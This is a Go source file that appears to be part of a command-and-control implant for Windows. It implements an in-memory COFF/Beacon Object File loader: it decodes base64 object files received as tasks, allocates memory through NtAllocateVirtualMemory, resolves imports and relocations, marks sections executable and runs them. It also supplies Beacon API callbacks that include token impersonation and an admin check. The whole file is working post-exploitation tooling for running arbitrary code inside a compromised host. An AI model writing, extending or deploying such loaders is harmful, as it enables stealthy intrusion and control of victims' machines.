//go:build windows

package agent

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── BOF execution context ──────────────────────────────────────────────────

var bofMu sync.Mutex // one BOF at a time — they share global state

type bofContext struct {
	out    strings.Builder
	fmtBufs sync.Map // uintptr → *strings.Builder  (formatp ptr → buffer)
	allocs []uintptr // VirtualAlloc'd memory to free on cleanup
}

// bofCtx is valid only while a BOF is running (protected by bofMu).
var bofCtx *bofContext

func bofAppendStr(s string) {
	if bofCtx != nil {
		bofCtx.out.WriteString(s)
	}
}

func bofAppendBytes(p uintptr, n int) {
	if bofCtx != nil && p != 0 && n > 0 {
		bofCtx.out.Write(unsafe.Slice((*byte)(unsafe.Pointer(p)), n))
	}
}

// ── COFF relocation constants ──────────────────────────────────────────────

const (
	IMAGE_REL_AMD64_ADDR64   = 0x0001
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32    = 0x0004
	IMAGE_REL_AMD64_REL32_1  = 0x0005
	IMAGE_REL_AMD64_REL32_2  = 0x0006
	IMAGE_REL_AMD64_REL32_3  = 0x0007
	IMAGE_REL_AMD64_REL32_4  = 0x0008
	IMAGE_REL_AMD64_REL32_5  = 0x0009
)

// ── C string helpers ────────────────────────────────────────────────────────

func readCStr(p uintptr) string {
	if p == 0 {
		return ""
	}
	for n := 0; n < 65536; n++ {
		if *(*byte)(unsafe.Pointer(p + uintptr(n))) == 0 {
			if n == 0 {
				return ""
			}
			return string(unsafe.Slice((*byte)(unsafe.Pointer(p)), n))
		}
	}
	return ""
}

func readWStr(p uintptr) string {
	if p == 0 {
		return ""
	}
	var ws []uint16
	for i := uintptr(0); i < 65536; i += 2 {
		v := *(*uint16)(unsafe.Pointer(p + i))
		if v == 0 {
			break
		}
		ws = append(ws, v)
	}
	return string(utf16.Decode(ws))
}

// bofSprintf handles common printf format codes for BeaconPrintf output.
func bofSprintf(format string, args ...uintptr) string {
	var out strings.Builder
	ai := 0
	i := 0
	for i < len(format) {
		if format[i] != '%' {
			out.WriteByte(format[i])
			i++
			continue
		}
		i++
		if i >= len(format) {
			out.WriteByte('%')
			break
		}
		// skip flags / width / precision
		for i < len(format) {
			c := format[i]
			if c == '-' || c == '+' || c == ' ' || c == '#' || c == '0' ||
				(c >= '1' && c <= '9') || c == '.' {
				i++
			} else if c == '*' {
				ai++ // width/precision from args
				i++
			} else {
				break
			}
		}
		// skip length modifier
		for i < len(format) && (format[i] == 'l' || format[i] == 'h' ||
			format[i] == 'I' || format[i] == 'z' || format[i] == 'L') {
			i++
		}
		if i >= len(format) {
			break
		}
		verb := format[i]
		i++

		var a uintptr
		if ai < len(args) {
			a = args[ai]
			ai++
		}

		switch verb {
		case 'd', 'i':
			out.WriteString(strconv.FormatInt(int64(int32(a)), 10))
		case 'u':
			out.WriteString(strconv.FormatUint(uint64(uint32(a)), 10))
		case 'x':
			out.WriteString(strconv.FormatUint(uint64(a), 16))
		case 'X':
			out.WriteString(strings.ToUpper(strconv.FormatUint(uint64(a), 16)))
		case 'o':
			out.WriteString(strconv.FormatUint(uint64(a), 8))
		case 'p':
			fmt.Fprintf(&out, "0x%x", a)
		case 's':
			out.WriteString(readCStr(a))
		case 'S':
			out.WriteString(readWStr(a))
		case 'c':
			out.WriteByte(byte(a))
		case 'n': // no-op
		case '%':
			out.WriteByte('%')
			ai-- // no arg consumed
		default:
			out.WriteByte('%')
			out.WriteByte(verb)
			ai--
		}
	}
	return out.String()
}

// ── datap / formatp layouts (must match C beacon.h on x64) ─────────────────

type cDatap struct {
	original uintptr // 8
	buffer   uintptr // 8
	length   int32   // 4
	size     int32   // 4  total: 24
}

type cFormatp struct {
	original uintptr // 8
	buffer   uintptr // 8
	length   int32   // 4
	size     int32   // 4  total: 24
}

// bofBswap32 converts big-endian (BOF wire format) to host order.
func bofBswap32(v int32) int32 {
	u := uint32(v)
	return int32((u >> 24) | ((u >> 8) & 0xff00) | ((u << 8) & 0xff0000) | (u << 24))
}

// ── Beacon API callbacks (registered once at init) ──────────────────────────

var (
	cbBeaconDataParse    uintptr
	cbBeaconDataInt      uintptr
	cbBeaconDataShort    uintptr
	cbBeaconDataLength   uintptr
	cbBeaconDataExtract  uintptr
	cbBeaconOutput       uintptr
	cbBeaconPrintf       uintptr
	cbBeaconFormatAlloc  uintptr
	cbBeaconFormatReset  uintptr
	cbBeaconFormatFree   uintptr
	cbBeaconFormatAppend uintptr
	cbBeaconFormatPrintf uintptr
	cbBeaconFormatToStr  uintptr
	cbBeaconFormatInt    uintptr
	cbBeaconIsAdmin      uintptr
	cbBeaconGetSpawnTo   uintptr
	cbToWideChar         uintptr
	cbBeaconInjectProc   uintptr
	cbBeaconInjectTmp    uintptr
	cbBeaconCleanupProc  uintptr
	cbBeaconSpawnTmp     uintptr
	cbBeaconRevertToken  uintptr
	cbBeaconUseToken     uintptr
	cbBeaconSetSleep     uintptr
)

func init() {
	cbBeaconDataParse = syscall.NewCallback(func(parserPtr, buf, size uintptr) uintptr {
		p := (*cDatap)(unsafe.Pointer(parserPtr))
		p.original, p.buffer = buf, buf
		p.length, p.size = int32(size), int32(size)
		return 0
	})

	cbBeaconDataInt = syscall.NewCallback(func(parserPtr uintptr) uintptr {
		p := (*cDatap)(unsafe.Pointer(parserPtr))
		if p.length < 4 {
			return 0
		}
		v := *(*int32)(unsafe.Pointer(p.buffer))
		p.buffer += 4
		p.length -= 4
		return uintptr(uint32(bofBswap32(v)))
	})

	cbBeaconDataShort = syscall.NewCallback(func(parserPtr uintptr) uintptr {
		p := (*cDatap)(unsafe.Pointer(parserPtr))
		if p.length < 2 {
			return 0
		}
		v := *(*uint16)(unsafe.Pointer(p.buffer))
		p.buffer += 2
		p.length -= 2
		return uintptr((v>>8) | (v<<8))
	})

	cbBeaconDataLength = syscall.NewCallback(func(parserPtr uintptr) uintptr {
		return uintptr((*cDatap)(unsafe.Pointer(parserPtr)).length)
	})

	cbBeaconDataExtract = syscall.NewCallback(func(parserPtr, sizePtr uintptr) uintptr {
		p := (*cDatap)(unsafe.Pointer(parserPtr))
		if p.length < 4 {
			return 0
		}
		ln := bofBswap32(*(*int32)(unsafe.Pointer(p.buffer)))
		p.buffer += 4
		p.length -= 4
		if ln < 0 || ln > p.length {
			return 0
		}
		out := p.buffer
		p.buffer += uintptr(ln)
		p.length -= ln
		if sizePtr != 0 {
			*(*int32)(unsafe.Pointer(sizePtr)) = ln
		}
		return out
	})

	cbBeaconOutput = syscall.NewCallback(func(typ, dataPtr, length uintptr) uintptr {
		bofAppendBytes(dataPtr, int(length))
		return 0
	})

	// 6 args: type, fmt, a0..a3 — covers ~95% of real BOF printf calls
	cbBeaconPrintf = syscall.NewCallback(func(typ, fmtPtr, a0, a1, a2, a3 uintptr) uintptr {
		if fmtPtr != 0 {
			bofAppendStr(bofSprintf(readCStr(fmtPtr), a0, a1, a2, a3))
		}
		return 0
	})

	cbBeaconFormatAlloc = syscall.NewCallback(func(fpPtr, maxsz uintptr) uintptr {
		if bofCtx != nil {
			var sb strings.Builder
			bofCtx.fmtBufs.Store(fpPtr, &sb)
		}
		fp := (*cFormatp)(unsafe.Pointer(fpPtr))
		fp.size = int32(maxsz)
		fp.length = 0
		return 0
	})

	cbBeaconFormatReset = syscall.NewCallback(func(fpPtr uintptr) uintptr {
		if bofCtx != nil {
			if v, ok := bofCtx.fmtBufs.Load(fpPtr); ok {
				v.(*strings.Builder).Reset()
			}
		}
		(*cFormatp)(unsafe.Pointer(fpPtr)).length = 0
		return 0
	})

	cbBeaconFormatFree = syscall.NewCallback(func(fpPtr uintptr) uintptr {
		if bofCtx != nil {
			bofCtx.fmtBufs.Delete(fpPtr)
		}
		return 0
	})

	cbBeaconFormatAppend = syscall.NewCallback(func(fpPtr, textPtr, ln uintptr) uintptr {
		if bofCtx != nil && textPtr != 0 && ln > 0 {
			s := string(unsafe.Slice((*byte)(unsafe.Pointer(textPtr)), ln))
			if v, ok := bofCtx.fmtBufs.Load(fpPtr); ok {
				v.(*strings.Builder).WriteString(s)
			}
			(*cFormatp)(unsafe.Pointer(fpPtr)).length += int32(ln)
		}
		return 0
	})

	cbBeaconFormatPrintf = syscall.NewCallback(func(fpPtr, fmtPtr, a0, a1, a2, a3 uintptr) uintptr {
		if bofCtx != nil && fmtPtr != 0 {
			s := bofSprintf(readCStr(fmtPtr), a0, a1, a2, a3)
			if v, ok := bofCtx.fmtBufs.Load(fpPtr); ok {
				v.(*strings.Builder).WriteString(s)
			}
			(*cFormatp)(unsafe.Pointer(fpPtr)).length += int32(len(s))
		}
		return 0
	})

	cbBeaconFormatToStr = syscall.NewCallback(func(fpPtr, sizePtr uintptr) uintptr {
		if bofCtx == nil {
			return 0
		}
		var content string
		if v, ok := bofCtx.fmtBufs.Load(fpPtr); ok {
			content = v.(*strings.Builder).String()
		}
		n := len(content)
		mem, err := windows.VirtualAlloc(0, uintptr(n+1),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			return 0
		}
		bofCtx.allocs = append(bofCtx.allocs, mem)
		if n > 0 {
			copy(unsafe.Slice((*byte)(unsafe.Pointer(mem)), n+1),
				append([]byte(content), 0))
		}
		if sizePtr != 0 {
			*(*int32)(unsafe.Pointer(sizePtr)) = int32(n)
		}
		(*cFormatp)(unsafe.Pointer(fpPtr)).original = mem
		return mem
	})

	cbBeaconFormatInt = syscall.NewCallback(func(fpPtr, value uintptr) uintptr {
		if bofCtx != nil {
			be := bofBswap32(int32(value))
			b := (*[4]byte)(unsafe.Pointer(&be))
			if v, ok := bofCtx.fmtBufs.Load(fpPtr); ok {
				v.(*strings.Builder).Write(b[:])
			}
			(*cFormatp)(unsafe.Pointer(fpPtr)).length += 4
		}
		return 0
	})

	cbBeaconIsAdmin = syscall.NewCallback(func() uintptr {
		var token windows.Token
		if err := windows.OpenProcessToken(windows.CurrentProcess(),
			windows.TOKEN_QUERY, &token); err != nil {
			return 0
		}
		defer token.Close()
		if token.IsElevated() {
			return 1
		}
		return 0
	})

	cbBeaconGetSpawnTo = syscall.NewCallback(func(x86, bufPtr, length uintptr) uintptr {
		s := `C:\Windows\System32\rundll32.exe`
		if x86 != 0 {
			s = `C:\Windows\SysWOW64\rundll32.exe`
		}
		n := len(s)
		if uintptr(n+1) > length {
			n = int(length) - 1
		}
		if n > 0 {
			copy(unsafe.Slice((*byte)(unsafe.Pointer(bufPtr)), n+1),
				append([]byte(s[:n]), 0))
		}
		return 0
	})

	mbtwc := windows.NewLazySystemDLL("kernel32.dll").NewProc("MultiByteToWideChar")
	cbToWideChar = syscall.NewCallback(func(srcPtr, dstPtr, maxChars uintptr) uintptr {
		r, _, _ := mbtwc.Call(65001, 0, srcPtr, ^uintptr(0), dstPtr, maxChars)
		return r
	})

	cbBeaconInjectProc = syscall.NewCallback(func(hProc, pid, payload, pLen, pOff, arg, aLen uintptr) uintptr { return 0 })
	cbBeaconInjectTmp = syscall.NewCallback(func(pInfo, payload, pLen, pOff, arg, aLen uintptr) uintptr { return 0 })
	cbBeaconCleanupProc = syscall.NewCallback(func(pInfo uintptr) uintptr { return 0 })
	cbBeaconSpawnTmp = syscall.NewCallback(func(x86, ignoreToken, si, pi uintptr) uintptr { return 0 })

	revertToSelf := windows.NewLazySystemDLL("advapi32.dll").NewProc("RevertToSelf")
	cbBeaconRevertToken = syscall.NewCallback(func() uintptr {
		r, _, _ := revertToSelf.Call()
		return r
	})

	impersonate := windows.NewLazySystemDLL("advapi32.dll").NewProc("ImpersonateLoggedOnUser")
	cbBeaconUseToken = syscall.NewCallback(func(token uintptr) uintptr {
		r, _, _ := impersonate.Call(token)
		return r
	})

	cbBeaconSetSleep = syscall.NewCallback(func(ms, jitter uintptr) uintptr { return 0 })
}

// beaconAPILookup maps Beacon API names to their callback addresses.
func beaconAPILookup(name string) uintptr {
	switch name {
	case "BeaconDataParse":              return cbBeaconDataParse
	case "BeaconDataInt":                return cbBeaconDataInt
	case "BeaconDataShort":              return cbBeaconDataShort
	case "BeaconDataLength":             return cbBeaconDataLength
	case "BeaconDataExtract":            return cbBeaconDataExtract
	case "BeaconOutput":                 return cbBeaconOutput
	case "BeaconPrintf":                 return cbBeaconPrintf
	case "BeaconFormatAlloc":            return cbBeaconFormatAlloc
	case "BeaconFormatReset":            return cbBeaconFormatReset
	case "BeaconFormatFree":             return cbBeaconFormatFree
	case "BeaconFormatAppend":           return cbBeaconFormatAppend
	case "BeaconFormatPrintf":           return cbBeaconFormatPrintf
	case "BeaconFormatToString":         return cbBeaconFormatToStr
	case "BeaconFormatInt":              return cbBeaconFormatInt
	case "BeaconIsAdmin":                return cbBeaconIsAdmin
	case "BeaconGetSpawnTo":             return cbBeaconGetSpawnTo
	case "toWideChar":                   return cbToWideChar
	case "BeaconInjectProcess":          return cbBeaconInjectProc
	case "BeaconInjectTemporaryProcess": return cbBeaconInjectTmp
	case "BeaconCleanupProcess":         return cbBeaconCleanupProc
	case "BeaconSpawnTemporaryProcess":  return cbBeaconSpawnTmp
	case "BeaconRevertToken":            return cbBeaconRevertToken
	case "BeaconUseToken":               return cbBeaconUseToken
	case "BeaconSetSleep":               return cbBeaconSetSleep
	}
	return 0
}

// ── COFF loader ─────────────────────────────────────────────────────────────

func resolveExternal(name string, ctx *bofContext) (uintptr, error) {
	if !strings.HasPrefix(name, "__imp_") {
		return 0, nil // unrecognized external — treat as NULL (BOF may not use it)
	}
	impName := name[6:]

	// Allocate 8-byte import thunk slot
	thunk, err := windows.VirtualAlloc(0, 8,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("alloc thunk: %w", err)
	}
	ctx.allocs = append(ctx.allocs, thunk)

	var funcAddr uintptr
	if idx := strings.Index(impName, "$"); idx >= 0 {
		// DLL$Function — e.g. KERNEL32$VirtualAlloc
		dllName := strings.ToLower(impName[:idx]) + ".dll"
		funcName := impName[idx+1:]
		dll, err := windows.LoadDLL(dllName)
		if err != nil {
			return 0, fmt.Errorf("LoadDLL %s: %w", dllName, err)
		}
		proc, err := dll.FindProc(funcName)
		if err != nil {
			return 0, fmt.Errorf("FindProc %s!%s: %w", dllName, funcName, err)
		}
		funcAddr = proc.Addr()
	} else {
		// Beacon API
		funcAddr = beaconAPILookup(impName)
		if funcAddr == 0 {
			return 0, fmt.Errorf("unknown beacon api: %s", impName)
		}
	}

	*(*uintptr)(unsafe.Pointer(thunk)) = funcAddr
	return thunk, nil
}

func applyReloc(patch, target uintptr, typ uint16) {
	switch typ {
	case IMAGE_REL_AMD64_ADDR64:
		p := (*uint64)(unsafe.Pointer(patch))
		*p += uint64(target)

	case IMAGE_REL_AMD64_REL32, IMAGE_REL_AMD64_REL32_1, IMAGE_REL_AMD64_REL32_2,
		IMAGE_REL_AMD64_REL32_3, IMAGE_REL_AMD64_REL32_4, IMAGE_REL_AMD64_REL32_5:
		n := uintptr(typ - IMAGE_REL_AMD64_REL32) // 0..5
		existing := int64(*(*int32)(unsafe.Pointer(patch)))
		next := int64(patch) + 4 + int64(n)
		*(*int32)(unsafe.Pointer(patch)) = int32(int64(target) + existing - next)

	case IMAGE_REL_AMD64_ADDR32NB:
		existing := int64(*(*int32)(unsafe.Pointer(patch)))
		*(*int32)(unsafe.Pointer(patch)) = int32(int64(target) + existing)
	}
}

// runBOF loads a COFF object file and executes its "go" entry point.
// packedArgs is a binary buffer parsed by the BOF via BeaconDataParse.
func runBOF(coffData, packedArgs []byte) (output string, err error) {
	bofMu.Lock()
	ctx := &bofContext{}
	bofCtx = ctx
	defer func() {
		bofCtx = nil
		for _, addr := range ctx.allocs {
			windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		}
		bofMu.Unlock()
		if r := recover(); r != nil {
			err = fmt.Errorf("BOF panic: %v", r)
		}
	}()

	if len(coffData) < 20 {
		return "", fmt.Errorf("COFF too small")
	}

	machine := binary.LittleEndian.Uint16(coffData[0:])
	if machine != 0x8664 {
		return "", fmt.Errorf("unsupported machine 0x%04x (need AMD64/0x8664)", machine)
	}

	numSections := int(binary.LittleEndian.Uint16(coffData[2:]))
	symTabOff := int(binary.LittleEndian.Uint32(coffData[8:]))
	numSymbols := int(binary.LittleEndian.Uint32(coffData[12:]))
	optHdrSize := int(binary.LittleEndian.Uint16(coffData[16:]))

	secBase := 20 + optHdrSize

	// ── Allocate and populate sections ───────────────────────────────────────
	type secInfo struct {
		mem  uintptr
		size uint32
		char uint32
	}
	secs := make([]secInfo, numSections)

	for i := 0; i < numSections; i++ {
		hdrOff := secBase + i*40
		if hdrOff+40 > len(coffData) {
			return "", fmt.Errorf("section header %d OOB", i)
		}
		h := coffData[hdrOff:]
		virtSize := binary.LittleEndian.Uint32(h[8:])
		rawSize := binary.LittleEndian.Uint32(h[16:])
		rawOff := binary.LittleEndian.Uint32(h[20:])
		char := binary.LittleEndian.Uint32(h[36:])

		allocSize := rawSize
		if virtSize > rawSize {
			allocSize = virtSize
		}
		if allocSize == 0 {
			continue
		}

		// Allocate as RW — relocations are applied before flipping to final perms.
		var mem uintptr
		allocSz := uintptr(allocSize)
		if rr, _, _ := procNtAllocateVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&mem)),
			0,
			uintptr(unsafe.Pointer(&allocSz)),
			uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
			uintptr(windows.PAGE_READWRITE),
		); rr != 0 {
			return "", fmt.Errorf("NtAllocateVirtualMemory section %d: 0x%x", i, rr)
		}
		ctx.allocs = append(ctx.allocs, mem)

		if rawSize > 0 {
			if int(rawOff)+int(rawSize) > len(coffData) {
				return "", fmt.Errorf("section %d raw data OOB", i)
			}
			copy(unsafe.Slice((*byte)(unsafe.Pointer(mem)), rawSize), coffData[rawOff:rawOff+rawSize])
		}
		secs[i] = secInfo{mem: mem, size: allocSize, char: char}
	}

	// ── Parse symbol table ────────────────────────────────────────────────────
	if symTabOff == 0 || numSymbols == 0 {
		return "", fmt.Errorf("no symbol table in COFF")
	}
	strTabOff := symTabOff + numSymbols*18

	getSymName := func(sym []byte) string {
		if binary.LittleEndian.Uint32(sym[:4]) == 0 {
			strOff := int(binary.LittleEndian.Uint32(sym[4:]))
			if strTabOff+strOff >= len(coffData) {
				return ""
			}
			tail := coffData[strTabOff+strOff:]
			n := bytes.IndexByte(tail, 0)
			if n < 0 {
				return string(tail)
			}
			return string(tail[:n])
		}
		n := bytes.IndexByte(sym[:8], 0)
		if n < 0 {
			n = 8
		}
		return string(sym[:n])
	}

	type symRec struct {
		name   string
		secNum int16
		value  uint32
	}
	symRecs := make([]symRec, numSymbols)
	symAddrs := make([]uintptr, numSymbols)

	for i := 0; i < numSymbols; {
		off := symTabOff + i*18
		if off+18 > len(coffData) {
			break
		}
		sym := coffData[off : off+18]
		name := getSymName(sym)
		secNum := int16(binary.LittleEndian.Uint16(sym[12:]))
		value := binary.LittleEndian.Uint32(sym[8:])
		aux := int(sym[17])

		symRecs[i] = symRec{name, secNum, value}

		if secNum > 0 && int(secNum) <= numSections {
			symAddrs[i] = secs[secNum-1].mem + uintptr(value)
		}

		i += 1 + aux
	}

	// ── Resolve external symbols ──────────────────────────────────────────────
	for i := 0; i < numSymbols; {
		r := symRecs[i]
		if r.secNum == 0 && r.name != "" && symAddrs[i] == 0 {
			addr, e := resolveExternal(r.name, ctx)
			if e != nil {
				return "", fmt.Errorf("symbol %q: %w", r.name, e)
			}
			symAddrs[i] = addr
		}
		off := symTabOff + i*18
		aux := 0
		if off+18 <= len(coffData) {
			aux = int(coffData[off+17])
		}
		i += 1 + aux
	}

	// ── Apply relocations ─────────────────────────────────────────────────────
	for i := 0; i < numSections; i++ {
		if secs[i].mem == 0 {
			continue
		}
		hdrOff := secBase + i*40
		h := coffData[hdrOff:]
		numRelocs := int(binary.LittleEndian.Uint16(h[32:]))
		relOff := int(binary.LittleEndian.Uint32(h[24:]))

		for j := 0; j < numRelocs; j++ {
			rOff := relOff + j*10
			if rOff+10 > len(coffData) {
				break
			}
			rel := coffData[rOff : rOff+10]
			virtAddr := binary.LittleEndian.Uint32(rel[0:])
			symIdx := int(binary.LittleEndian.Uint32(rel[4:]))
			relocType := binary.LittleEndian.Uint16(rel[8:])

			if symIdx >= numSymbols {
				continue
			}
			target := symAddrs[symIdx]
			patch := secs[i].mem + uintptr(virtAddr)

			applyReloc(patch, target, relocType)
		}
	}

	// ── Finalise section permissions (RW during relocs → correct perms now) ────
	// IMAGE_SCN flags: 0x20000000=exec 0x40000000=read 0x80000000=write
	for i := 0; i < numSections; i++ {
		if secs[i].mem == 0 {
			continue
		}
		var prot uintptr
		exec := secs[i].char&0x20000000 != 0
		write := secs[i].char&0x80000000 != 0
		switch {
		case exec && write:
			prot = uintptr(windows.PAGE_EXECUTE_READWRITE)
		case exec:
			prot = uintptr(windows.PAGE_EXECUTE_READ)
		case write:
			prot = uintptr(windows.PAGE_READWRITE)
		default:
			prot = uintptr(windows.PAGE_READONLY)
		}
		base := secs[i].mem
		sz := uintptr(secs[i].size)
		var old uint32
		procNtProtectVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&base)),
			uintptr(unsafe.Pointer(&sz)),
			prot,
			uintptr(unsafe.Pointer(&old)),
		)
	}

	// ── Find entry point ──────────────────────────────────────────────────────
	var entry uintptr
	for i := 0; i < numSymbols; {
		r := symRecs[i]
		if r.name == "go" && r.secNum > 0 && int(r.secNum) <= numSections {
			entry = secs[r.secNum-1].mem + uintptr(r.value)
			break
		}
		off := symTabOff + i*18
		aux := 0
		if off+18 <= len(coffData) {
			aux = int(coffData[off+17])
		}
		i += 1 + aux
	}
	if entry == 0 {
		return "", fmt.Errorf("entry point 'go' not found in COFF")
	}

	// ── Allocate stable args buffer ────────────────────────────────────────────
	var argsPtr, argsLen uintptr
	if len(packedArgs) > 0 {
		var argsMem uintptr
		argsSz := uintptr(len(packedArgs))
		if rr, _, _ := procNtAllocateVirtualMemory.Call(
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&argsMem)),
			0,
			uintptr(unsafe.Pointer(&argsSz)),
			uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
			uintptr(windows.PAGE_READWRITE),
		); rr != 0 {
			return "", fmt.Errorf("NtAllocateVirtualMemory args: 0x%x", rr)
		}
		ctx.allocs = append(ctx.allocs, argsMem)
		copy(unsafe.Slice((*byte)(unsafe.Pointer(argsMem)), len(packedArgs)), packedArgs)
		argsPtr = argsMem
		argsLen = uintptr(len(packedArgs))
	}

	// ── Execute BOF ───────────────────────────────────────────────────────────
	syscall.Syscall(entry, 2, argsPtr, argsLen, 0)

	return ctx.out.String(), nil
}

// readFileForBOF reads a local file path for the "b" arg type.
// This runs on the agent so it reads from the agent's filesystem.
func readFileForBOF(path string) ([]byte, error) {
	// Avoid import cycle — reimplement minimal read here
	return os.ReadFile(path)
}

// bofPackArgs packs CLI-style "value:type" args into the BOF binary format.
// Types: z=string, Z=wstring, i=int32, s=int16, b=binary-file
func bofPackArgs(specs []string) ([]byte, error) {
	var buf bytes.Buffer
	for _, spec := range specs {
		idx := strings.LastIndex(spec, ":")
		if idx < 0 {
			return nil, fmt.Errorf("arg %q must be value:type", spec)
		}
		val, typ := spec[:idx], spec[idx+1:]
		switch typ {
		case "z": // C string
			data := append([]byte(val), 0)
			_ = binary.Write(&buf, binary.BigEndian, uint32(len(data)))
			buf.Write(data)
		case "Z": // wide string
			wc := utf16.Encode([]rune(val))
			wc = append(wc, 0)
			b := make([]byte, len(wc)*2)
			for k, v := range wc {
				binary.LittleEndian.PutUint16(b[k*2:], v)
			}
			_ = binary.Write(&buf, binary.BigEndian, uint32(len(b)))
			buf.Write(b)
		case "i": // int32
			n, e := strconv.ParseInt(val, 0, 32)
			if e != nil {
				return nil, fmt.Errorf("arg %q: %w", spec, e)
			}
			_ = binary.Write(&buf, binary.BigEndian, int32(n))
		case "s": // int16
			n, e := strconv.ParseInt(val, 0, 16)
			if e != nil {
				return nil, fmt.Errorf("arg %q: %w", spec, e)
			}
			_ = binary.Write(&buf, binary.BigEndian, int16(n))
		case "b": // binary file
			data, e := readFileForBOF(val)
			if e != nil {
				return nil, fmt.Errorf("arg %q: %w", spec, e)
			}
			_ = binary.Write(&buf, binary.BigEndian, uint32(len(data)))
			buf.Write(data)
		default:
			return nil, fmt.Errorf("unknown arg type %q (z=str, Z=wstr, i=int, s=short, b=file)", typ)
		}
	}
	return buf.Bytes(), nil
}

// ── BOF Data Store ────────────────────────────────────────────────────────────

var bofDS struct {
	sync.Mutex
	m map[string][]byte
}

func bofDSLoad(name string, data []byte) {
	bofDS.Lock()
	defer bofDS.Unlock()
	if bofDS.m == nil {
		bofDS.m = make(map[string][]byte)
	}
	bofDS.m[name] = data
}

func bofDSGet(name string) ([]byte, bool) {
	bofDS.Lock()
	defer bofDS.Unlock()
	d, ok := bofDS.m[name]
	return d, ok
}

func bofDSList() string {
	bofDS.Lock()
	defer bofDS.Unlock()
	if len(bofDS.m) == 0 {
		return "(bof store empty)"
	}
	var sb strings.Builder
	for k, v := range bofDS.m {
		fmt.Fprintf(&sb, "  %-30s  %d bytes\n", k, len(v))
	}
	return sb.String()
}

func bofDSRemove(name string) {
	bofDS.Lock()
	defer bofDS.Unlock()
	delete(bofDS.m, name)
}

// dispatchBOF handles a BOF task: Payload=base64(COFF), Args=base64(packed args).
// If Payload is empty, checks the BOF store for a matching name in task.Args.
func dispatchBOF(task taskWire) (string, error) {
	var coffData []byte
	var err error

	if task.Payload != "" {
		coffData, err = base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			return "", fmt.Errorf("decode COFF: %w", err)
		}
	} else {
		// Try to look up the name from the BOF store
		name := strings.Fields(task.Args)
		if len(name) > 0 {
			if d, ok := bofDSGet(name[0]); ok {
				coffData = d
			}
		}
		if coffData == nil {
			return "", fmt.Errorf("empty BOF payload")
		}
	}

	var packedArgs []byte
	if task.Args != "" {
		packedArgs, err = base64.StdEncoding.DecodeString(task.Args)
		if err != nil {
			// Args may be a plain name (not base64 packed args) when using store
			packedArgs = nil
		}
	}
	return runBOF(coffData, packedArgs)
}
